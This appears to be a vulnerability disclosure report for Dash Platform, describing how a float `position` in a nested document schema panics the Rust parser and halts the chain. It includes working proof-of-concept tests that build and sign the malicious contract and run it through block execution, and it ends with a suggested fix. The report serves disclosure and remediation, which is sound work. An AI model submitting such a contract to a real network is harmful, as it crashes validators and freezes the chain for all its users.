# Unvalidated `position` type in nested document-schema properties panics `try_from_schema`, causing a deterministic chain halt (malicious proposer) and a low-cost node shutdown (any registered identity)

A type-confusion / missing-input-validation bug in Dash Platform's data-contract schema parser. A document schema whose **nested** object property carries a `position` that is a zero-fraction **float** (e.g. `0.0`) is accepted by the JSON meta-schema but panics the Rust parser (`get_integer::<u64>().expect(...)`). Because this parse runs in the consensus/block-execution validation mode and the production panic hook shuts the node down, a single **self-signed** `DataContractCreate` included in a block halts every validator that executes it. The same defect (with a wider set of malformed positions) also lets the holder of any registered, funded identity shut down nodes via `check_tx`. The precondition is **permissionless but authenticated** — the attacker signs the malformed contract with their *own* identity key (signature verification runs before the parse, so it is *not* anonymous/unauthenticated), but identity registration is open to anyone and the attack itself is free to repeat (the panic precedes fee charging). See **Preconditions, Caveats & Prior Art** below.



## Brief / Intro

`DocumentType::try_from_schema` builds a document type from a data-contract JSON schema during every state-transition that touches a contract. When it sorts the sub-properties of a **nested** object by their `position`, it reads `position` as a `u64` with `.expect("expected a position")`. The document meta-schema only requires `position` to be `{type: integer, minimum: 0}`, but JSON-Schema "integer" admits a zero-fraction float (`0.0`) and is unbounded, while the Rust reader rejects `Value::Float` and any value `> u64::MAX`. A nested `position: 0.0` therefore **passes meta-schema validation yet panics the parser** — and it does so in `full_validation = true`, the mode used during block execution. With no `catch_unwind` in the block pipeline and a panic hook that calls `cancel.cancel()`, the panic shuts the whole `drive-abci` node down. In production this means a malicious block proposer (an evonode, signing the contract with its own identity) can deterministically halt the Dash Platform chain (all validators crash on the same block), and the holder of any registered, funded identity can repeatedly shut down reachable nodes through `check_tx` (where `missing`/`float`/`negative`/`>u64::MAX` positions all panic). Recovery requires patching and restarting every node. The precondition is permissionless but **authenticated** (a valid self-signature is required — see Preconditions, Caveats & Prior Art).



## Vulnerability Details

### The panicking code

`packages/rs-dpp/src/data_contract/document_type/class_methods/try_from_schema/mod.rs`, function `insert_values_nested` (the recursive parser for nested object properties):

```rust
// L207-217
let mut sorted_properties: Vec<_> = properties.iter().collect();

sorted_properties.sort_by(|(_, value_1), (_, value_2)| {
    let pos_1: u64 = value_1
        .get_integer(property_names::POSITION)
        .expect("expected a position");        // L211  <-- panics
    let pos_2: u64 = value_2
        .get_integer(property_names::POSITION)
        .expect("expected a position");        // L215  <-- panics
    pos_1.cmp(&pos_2)
});
```

`get_integer::<u64>()` delegates to `Value::to_integer` (`packages/rs-platform-value/src/lib.rs:278-307`), which only accepts the integer `Value` variants and returns `Err` for everything else:

```rust
match self {
    Value::U128(int) => (*int).try_into().map_err(|_| Error::IntegerSizeError),
    // ... I128/U64/I64/.../U8/I8 ...
    other => Err(Error::StructureError(format!(
        "value is not an integer, found {}", other))),   // <-- Value::Float lands here
}
```

So `position` panics `insert_values_nested` when it is **missing**, a **float** (`Value::Float`, e.g. `0.0`), **negative**, or `> u64::MAX` (`IntegerSizeError`).

### Why the meta-schema does not catch the float

The document meta-schema (`packages/rs-dpp/schema/meta_schemas/document/v1/document-meta.json:140-143`) constrains `position` as:

```json
"position": { "type": "integer", "minimum": 0 }
```

JSON-Schema "integer" matches any number with a zero fractional part — **including `0.0`** — and imposes no upper bound. So `position: 0.0` (and `position > u64::MAX`) are *valid* per the meta-schema. The meta-schema rejects only `missing` (`required`) and `negative` (`minimum: 0`).

### Why this reaches block execution (full_validation = true)

In `try_from_schema/v1/mod.rs`, the meta-schema check is gated behind `full_validation`, but `insert_values_nested` is called **unconditionally**:

```rust
// v1/mod.rs:240-263  (gated)
#[cfg(feature = "validation")]
if full_validation {
    // ... validate_max_depth, meta-schema, position-continuity (top-level only) ...
}

// v1/mod.rs:284-309  (UNCONDITIONAL — runs for every parse)
for (property_key, property_value) in property_values {
    insert_values(...)?;          // top-level flatten (uses Result, safe)
    insert_values_nested(...)?;   // <-- nested sort with .expect() panic
}
```

`ValidationMode::Validator` (block execution) sets `full_validation = true`:

```rust
// data_contract_create/mod.rs:35-43
pub fn should_fully_validate_contract_on_transform_into_action(&self) -> bool {
    match self {
        ValidationMode::CheckTx => false,
        ValidationMode::RecheckTx => false,
        ValidationMode::Validator => true,     // <-- block execution
        ValidationMode::NoValidation => false,
    }
}
```

The full block-execution call chain that reaches the panic:

```
run_block_proposal  (ProcessProposal / FinalizeBlock)
  -> process_raw_state_transitions
    -> process_state_transition  (ValidationMode::Validator)
      -> data_contract_create::transform_into_action_v0          (state/v0/mod.rs:400)
        -> DataContractCreateTransitionAction::try_from_borrowed_transition(.., full_validation = true, ..)
          -> DataContract::try_from_platform_versioned(serialized_contract, /*full_validation*/ true, ..)   (serialized_version/mod.rs:449)
            -> (loops document_schemas) DocumentType::try_from_schema(.., true, ..)
              -> insert_values_nested -> get_integer::<u64>(POSITION).expect()  -> PANIC
```

Note that the float can only exist in the **serialized** contract form: a runtime `DataContract` cannot be built with it (construction itself panics in `insert_values_nested`). This is precisely the on-the-wire attack — a serialized contract that crashes the victim node when it converts it to runtime form.

### Why the panic is not contained, and shuts the node down

The immediate caller catches only `Result::Err`, not panics:

```rust
// data_contract_create/state/v0/mod.rs:189-196
match result {
    Err(ProtocolError::ConsensusError(consensus_error)) => { /* graceful bump-nonce */ }
    // a PANIC unwinds straight past this match
```

There is **no `catch_unwind`** anywhere in the `drive-abci` block-processing path, and the production panic hook shuts the entire node down:

```rust
// packages/rs-drive-abci/src/main.rs:626-632
fn install_panic_hook(cancel: CancellationToken) {
    std::panic::set_hook(Box::new(move |info| {
        tracing::error!(panic=%info, "panic");
        cancel.cancel();   // ANY panic -> the whole drive-abci node shuts down
    }));
}
```

### Trigger condition

`sort_by` only invokes its comparator when there are **≥ 2** elements, so the panic requires an object property with **at least two nested sub-properties**, one of which carries the poison `position` (a single nested property does not trigger it — confirmed empirically). This is trivial to satisfy.

---

## Impact Details

This is a consensus **liveness** vulnerability (a chain halt — not a generic application-layer DoS) with two attack flavors:

1. **Deterministic chain halt (block execution) — the primary, Critical impact.**
   A malicious block proposer (an evonode in the validator set) crafts a `DataContractCreate` whose document schema has a nested `position: 0.0`, signs it with **its own** registered identity, and includes it in a block it proposes. Every validator runs the block through `process_raw_state_transitions` with `ValidationMode::Validator` → `full_validation = true`. The meta-schema *accepts* the zero-fraction float, the parser then panics, the panic hook calls `cancel.cancel()`, and the validator's `drive-abci` shuts down. Because the block is deterministic, **all** validators crash on it. The Platform chain stops producing/finalizing blocks and cannot recover without an out-of-band coordinated patch + restart of the validator network. A **single** malicious evonode, on its proposal turn, halts the entire network. (Note: only the **float** reaches the block-execution panic — `missing`/`negative`/`> u64::MAX` are rejected gracefully by the `full_validation=true` meta-schema and would *not* halt a block; they only crash `check_tx`.) Cost to attacker: one evonode (its normal collateral) + one registered identity; the malicious block is never committed and no fee is charged, so it is free to repeat.

2. **Node-shutdown via `check_tx` (permissionless but authenticated).**
   In `check_tx` the contract parses with `full_validation = false`, so the meta-schema is skipped entirely and **all** malformed positions (`missing`, `float`, `negative`, `> u64::MAX`) panic. The holder of any registered, funded identity submits such a self-signed `DataContractCreate`; every node that runs `check_tx` (FirstTimeCheck) on it shuts down via the same panic hook. The panic occurs **before** any fee is charged, so it is free to repeat. It does **not** self-propagate (the crashing node rejects the tx before adding it to its mempool, so it is never gossiped), so the attacker sends it directly to the nodes they can reach — public DAPI/full-node `broadcastStateTransition` endpoints, and any validator whose mempool RPC is reachable — taking them offline.

In both flavors nodes terminate, the chain stops making progress, and operator intervention is required. For a BFT chain, a remotely-triggerable, deterministic, network-wide validator crash is a **Critical** severity issue (total loss of chain liveness). It does not directly move funds, but it freezes all Platform activity (identities, documents, contracts, credit transfers, withdrawals) for the duration of the outage.

---

## Preconditions, Caveats & Prior Art

Stated up-front and honestly, with code evidence, so triage can calibrate.

**Exact precondition (it is permissionless but AUTHENTICATED, not anonymous).** Signature + identity-existence verification runs *before* the schema parse on every reachable path, so a garbage/empty signature is rejected (`IdentityNotFoundError` / `InvalidStateTransitionSignatureError`) before the panic:
- Block execution: `processor/v0/mod.rs:59` (identity-signed verification) runs before the panic at `:242` (`validate_advanced_structure` → `transform_into_action(Validator)`).
- `check_tx` FirstTimeCheck: `check_tx_verification/v0/mod.rs:165` (signature verification) runs before the panic at `:256/:321` (`transform_into_action(CheckTx)`).
- Basic structure validation runs early but never parses `document_schemas`, so it does not catch the float or short-circuit the panic.

So the attacker must control **a registered, funded Platform identity** and **self-sign** the malformed contract. Identity registration is permissionless (open to anyone via a Core asset lock) but has a small cost; this is therefore a low-cost, authenticated, permissionless precondition — **the report does not claim "unauthenticated."** For the *block-execution chain halt* specifically, the attacker must additionally be a **block proposer (evonode)**: an honest proposer never includes the tx (its own `check_tx` would crash on it), so the tx enters a block only via a malicious proposer's `PrepareProposal`. A single malicious evonode suffices.

**Not permission-gated / not feature-flagged / not trusted-actor.** `DataContractCreate` has `has_is_allowed_validation() == false` (`.../data_contract_create/.../is_allowed.rs:41-48`) — no spork, allowlist, governance gate, or activation flag. There is no trust-model assumption that contract schemas come from an honest source; the pipeline validates them as adversarial input. So the finding is not excludable on a "privileged/trusted actor" or "feature disabled" basis.

**Free to repeat (panic precedes fees and commit).** The panic unwinds out of `process_state_transition` *before* `execute_event` (fee charging) and before the block transaction is committed (`process_raw_state_transitions/v0/mod.rs:278`). The malicious tx is never paid for and never committed; the attacker can reuse the same identity/nonce indefinitely.

**Trigger requires ≥ 2 nested sub-properties** (the `sort_by` comparator only runs with ≥ 2 elements). Trivial to satisfy; the PoCs account for it.

**Not previously known, not fixed, live component:**
- No code comment acknowledges the panic; the `// TODO: This is quite big` at `try_from_schema/mod.rs:172` is an unrelated refactor note, and the `.expect("expected a position")` carries no justifying comment.
- Existing team tests cover only the **top-level missing-position** path (graceful `MissingPositionsInDocumentTypePropertiesError`, code `10411`, via the continuity check in `v1/mod.rs:248-250`) — structurally distinct from the **nested** `.expect()` panic in `insert_values_nested`. No team test covers a nested or non-integer (float) position. (The PoC tests referenced below are this report's own additions, not Dash's.)
- The `.expect("expected a position")` is still present and unfixed in upstream `master`, the default `v3.1-dev` branch, and the live `v3.x` release line (verified against upstream raw sources). No commit references position/panic/get_integer hardening.
- No `CHANGELOG.md` / `SECURITY.md` mention; the meta-schema still defines `position` as `{type:integer, minimum:0}` (no `maximum`, no non-integer rejection).
- Dash Platform / Evolution is **live on mainnet**, so the affected data-contract schema parser is a production consensus component (the cloned `v4.0.0-rc.1` and the live `v3.x` line share the identical `.expect()`).

**Severity framing.** This is a **chain-halt / consensus-liveness** failure, not a generic application-layer "DoS / resource-exhaustion" issue (which some programs exclude). The block-execution variant is a deterministic, single-proposer, network-wide consensus halt — the highest-impact liveness class.

**Disclosure.** Dash runs a managed bug-bounty program via Bugcrowd (historically private — "do not discuss outside the program"). Submit through that program, confirm the chain-halt/DoS scope and reward terms against the program rules, and do not discuss publicly until permitted. The PoCs here were run on a local in-process / regtest-class harness only; nothing was broadcast to any public network.

---

## References

- Panic site: `packages/rs-dpp/src/data_contract/document_type/class_methods/try_from_schema/mod.rs#L207-L217` (`insert_values_nested`)
- Integer coercion that rejects floats / out-of-range: `packages/rs-platform-value/src/lib.rs#L278-L307` (`Value::to_integer`)
- Meta-schema `position` definition (accepts zero-fraction float, unbounded): `packages/rs-dpp/schema/meta_schemas/document/v1/document-meta.json#L140-L143`
- Unconditional call of `insert_values_nested` + gated meta-schema: `packages/rs-dpp/src/data_contract/document_type/class_methods/try_from_schema/v1/mod.rs#L240-L309`
- Validator mode → `full_validation = true`: `packages/rs-drive-abci/src/execution/validation/state_transition/state_transitions/data_contract_create/mod.rs#L35-L43`
- Block-exec conversion call: `packages/rs-drive/src/state_transition_action/contract/data_contract_create/v0/transformer.rs#L18-L40`; `packages/rs-dpp/src/data_contract/serialized_version/mod.rs#L449-L454`
- Non-graceful caller (only catches `Result::Err`): `packages/rs-drive-abci/src/execution/validation/state_transition/state_transitions/data_contract_create/state/v0/mod.rs#L189-L196`
- Panic hook that shuts down the node: `packages/rs-drive-abci/src/main.rs#L626-L632`

---

## Proof of Concept

All confirmation was done locally with `cargo` against the real consensus code (regtest-class `TempPlatform`); no transaction was broadcast to any public network.

### PoC 1 — parse layer (shows the float uniquely bypasses the meta-schema into block-execution mode)

Add to `packages/rs-dpp/src/data_contract/document_type/class_methods/try_from_schema/v1/mod.rs` (inside `mod tests`):

```rust
mod position_type_confusion_poc {
    use super::*;
    use std::panic::{catch_unwind, AssertUnwindSafe};

    fn obj(pairs: Vec<(&str, Value)>) -> Value {
        Value::Map(pairs.into_iter().map(|(k, v)| (Value::Text(k.to_string()), v)).collect())
    }

    // outer(object, pos 0) -> { inner_a(string, <inner_position>), inner_b(string, pos 1) }
    // TWO nested sub-properties are required so sort_by() invokes its comparator.
    fn schema_with_nested_inner_position(inner_position: Option<Value>) -> Value {
        let mut a = vec![("type", Value::Text("string".into()))];
        if let Some(p) = inner_position { a.push(("position", p)); }
        a.push(("maxLength", Value::U64(10)));
        let inner_a = obj(a);
        let inner_b = obj(vec![
            ("type", Value::Text("string".into())),
            ("position", Value::U64(1)),
            ("maxLength", Value::U64(10)),
        ]);
        let outer = obj(vec![
            ("type", Value::Text("object".into())),
            ("position", Value::U64(0)),
            ("properties", obj(vec![("inner_a", inner_a), ("inner_b", inner_b)])),
            ("additionalProperties", Value::Bool(false)),
        ]);
        obj(vec![
            ("type", Value::Text("object".into())),
            ("properties", obj(vec![("outer", outer)])),
            ("additionalProperties", Value::Bool(false)),
        ])
    }

    fn run(label: &str, pos: Option<Value>, full_validation: bool) {
        let pv = PlatformVersion::latest();
        let config = DataContractConfig::default_for_version(pv).expect("config");
        let v = config.version();
        let schema = schema_with_nested_inner_position(pos);
        let r = catch_unwind(AssertUnwindSafe(|| {
            DocumentTypeV1::try_from_schema(
                Identifier::new([1; 32]), 1, v, "doc", schema, None,
                &BTreeMap::new(), &config, full_validation, &mut vec![], pv,
            )
        }));
        match r {
            Err(_)     => eprintln!(">>> [{label}] full_validation={full_validation} => *** PANIC ***"),
            Ok(Ok(_))  => eprintln!(">>> [{label}] full_validation={full_validation} => Ok"),
            Ok(Err(_)) => eprintln!(">>> [{label}] full_validation={full_validation} => clean Err"),
        }
    }

    #[test]
    fn position_type_confusion_experiment() {
        run("valid_u64",   Some(Value::U64(0)), false);
        run("valid_u64",   Some(Value::U64(0)), true);
        run("missing",     None, false);
        run("missing",     None, true);
        run("float_0.0",   Some(Value::Float(0.0)), false);
        run("float_0.0",   Some(Value::Float(0.0)), true);   // <-- PANIC at full_validation=true
        run("u128>u64MAX", Some(Value::U128(u64::MAX as u128 + 1)), false);
        run("u128>u64MAX", Some(Value::U128(u64::MAX as u128 + 1)), true);
        run("i64_negative", Some(Value::I64(-1)), false);
        run("i64_negative", Some(Value::I64(-1)), true);
    }
}
```

Run:
```
cargo test -p dpp --features validation --lib position_type_confusion_experiment -- --nocapture --test-threads=1
```

Observed output (abbreviated):
```
[valid_u64]   full_validation=false/true => Ok
[missing]     full_validation=false => *** PANIC ***   ; true => clean Err
[float_0.0]   full_validation=false => *** PANIC ***   ; true => *** PANIC ***   <-- CRITICAL
[u128>u64MAX] full_validation=false => *** PANIC ***   ; true => clean Err
[i64_negative]full_validation=false => *** PANIC ***   ; true => clean Err
panicked at .../try_from_schema/mod.rs:215: expected a position: StructureError("value is not an integer, found float 0")
```

### PoC 2 — end-to-end through the real block-execution entry (live `TempPlatform`)

Add to `packages/rs-drive-abci/src/execution/validation/state_transition/state_transitions/data_contract_create/mod.rs` (inside `mod tests`, which already imports `setup_identity`, `TestPlatformBuilder`, `Value`, `BlockInfo`, `dash_to_credits`, `DataContract`, `PlatformSerializable`, identity getters):

```rust
#[tokio::test]
async fn float_nested_position_halts_block_execution_security_poc() {
    use dpp::state_transition::data_contract_create_transition::methods::DataContractCreateTransitionMethodsV0;
    use dpp::state_transition::data_contract_create_transition::DataContractCreateTransition;
    use dpp::state_transition::StateTransition;
    use dpp::tests::json_document::json_document_to_contract_with_ids;
    use std::panic::{catch_unwind, AssertUnwindSafe};

    let platform_version = PlatformVersion::latest();
    let mut platform = TestPlatformBuilder::new().build_with_mock_rpc().set_genesis_state();
    let platform_state = platform.state.load();

    // A normal funded identity == the attacker.
    let (identity, signer, key) = setup_identity(&mut platform, 9_001, dash_to_credits!(2.0));

    // malicious schema: nested object whose sub-property `inner_a` has a float position 0.0
    let oo = |p: Vec<(&str, Value)>| Value::Map(p.into_iter().map(|(k, v)| (Value::Text(k.to_string()), v)).collect());
    let inner_a = oo(vec![("type", Value::Text("string".into())), ("position", Value::Float(0.0)), ("maxLength", Value::U64(10))]);
    let inner_b = oo(vec![("type", Value::Text("string".into())), ("position", Value::U64(1)),     ("maxLength", Value::U64(10))]);
    let outer   = oo(vec![("type", Value::Text("object".into())), ("position", Value::U64(0)),
                          ("properties", oo(vec![("inner_a", inner_a), ("inner_b", inner_b)])),
                          ("additionalProperties", Value::Bool(false))]);
    let doc_schema = oo(vec![("type", Value::Text("object".into())),
                            ("properties", oo(vec![("outer", outer)])),
                            ("additionalProperties", Value::Bool(false))]);
    let mut document_schemas = BTreeMap::new();
    document_schemas.insert("note".to_string(), doc_schema);

    // Bootstrap a valid signed DataContractCreate, then overwrite its SERIALIZED schemas
    // with the malicious one and re-sign (the float can only live in serialized form).
    let mut bootstrap = json_document_to_contract_with_ids(
        "tests/supporting_files/contract/dpns/dpns-contract-contested-unique-index.json",
        None, None, false, platform_version,
    ).expect("load bootstrap contract");
    bootstrap.set_config(DataContractConfig::default_for_version(platform_version).unwrap());

    let mut state_transition = DataContractCreateTransition::new_from_data_contract(
        bootstrap, 1, &identity.into_partial_identity_info(), key.id(), &signer, platform_version, None,
    ).await.expect("build + sign");

    if let StateTransition::DataContractCreate(DataContractCreateTransition::V0(v0)) = &mut state_transition {
        let s = v0.data_contract.document_schemas_mut();
        s.clear();
        s.extend(document_schemas.clone());
    } else { panic!("expected V0"); }

    state_transition.sign_external(
        &key, &signer,
        None::<fn(Identifier, String) -> Result<dpp::identity::SecurityLevel, dpp::ProtocolError>>,
    ).await.expect("re-sign");

    let raw = state_transition.serialize_to_bytes().expect("serialize");
    let transaction = platform.drive.grove.start_transaction();

    // EXACT operation a validator runs while executing a block:
    let result = catch_unwind(AssertUnwindSafe(|| {
        platform.platform.process_raw_state_transitions(
            &[raw], &platform_state, &BlockInfo::default(), &transaction, platform_version, false, None,
        )
    }));
    assert!(result.is_err(), "block execution must PANIC on a nested float position (chain halt)");
}
```

Run:
```
cargo test -p drive-abci --lib float_nested_position_halts_block_execution_security_poc -- --nocapture --test-threads=1
```

Observed output:
```
running 1 test
thread '...float_nested_position_halts_block_execution_security_poc' panicked at
  packages/rs-dpp/.../try_from_schema/mod.rs:215:30:
  expected a position: StructureError("value is not an integer, found float 0")
>>> process_raw_state_transitions => *** PANIC: validator crashes (panic hook cancels the node) -> chain halt ***
test result: ok. 1 passed
```

`process_raw_state_transitions` is exactly what `run_block_proposal` invokes during `ProcessProposal`/`FinalizeBlock`. The validly-signed `DataContractCreate` from a funded identity panics the consensus validation; in production the panic hook (`main.rs:626`) then shuts the validator down. Every validator processing this block does the same → deterministic chain halt.

### PoC 3 — multi-masternode chain demonstration (100 MN / 24-validator quorums)

To demonstrate the network-wide effect, Dash's own `strategy_tests` harness runs a real simulated masternode network through the actual consensus block engine (`run_chain_for_strategy` → `mimic_execute_block` = ProcessProposal + FinalizeBlock with quorum/proposer logic). An env-gated hook in `contract_state_transitions` (`packages/rs-drive-abci/tests/strategy_tests/strategy.rs`) injects the float `position` into the deployed contract's serialized form and re-signs it; a new test (`packages/rs-drive-abci/tests/strategy_tests/failures.rs`) runs a 100-MN / 24-validator-quorum chain on a large-stack thread and asserts the chain panics:

```
cargo test -p drive-abci --test strategy_tests \
  run_chain_multivalidator_chain_halt_on_nested_float_position_security_poc -- --nocapture
```

Observed output:
```
running 1 test
>>> [POISON] injected nested float `position: 0.0` into DataContractCreate; submitting to the multi-masternode block engine
thread '<unnamed>' panicked at packages/rs-dpp/.../try_from_schema/mod.rs:215:30:
  expected a position: StructureError("value is not an integer, found float 0")
>>> CONFIRMED: 100-MN / 24-validator-quorum chain HALTED — mimic_execute_block panicked processing
    the nested-float-position DataContractCreate (deterministic chain halt; in production the panic
    hook then shuts every node down).
test result: ok. 1 passed
```

The chain never completes its scheduled blocks — it dies at the contract-deploy block inside the multi-validator block engine. (`mimic_execute_block` runs the same `ProcessProposal`/`FinalizeBlock` code path that Dockerized devnet validators run; the only thing a full `dashmate` Docker devnet adds is process/network isolation, which does not change the deterministic crash.)

### Suggested fix

Make `insert_values_nested` return a consensus error instead of panicking (it already returns `Result<(), DataContractError>`), and tighten the meta-schema:

```rust
// replace the sort_by(.expect()) with a fallible pre-extraction:
let mut keyed: Vec<(u64, &(Value, Value))> = Vec::with_capacity(properties.len());
for prop @ (_, value) in properties.iter() {
    let pos: u64 = value.get_integer(property_names::POSITION).map_err(|_| {
        DataContractError::InvalidContractStructure(
            "nested document property `position` must be a non-negative integer that fits u64".to_string(),
        )
    })?;
    keyed.push((pos, prop));
}
keyed.sort_by_key(|(p, _)| *p);
let sorted_properties: Vec<_> = keyed.into_iter().map(|(_, p)| p).collect();
```

This turns every malformed-position variant (missing/float/negative/huge) into a clean rejection on **both** `check_tx` and block-execution paths. Additionally constrain `position` in the meta-schema to integer-only with a `u64` `maximum`, and audit other `get_integer(...).expect(...)` calls reachable from state-transition processing.
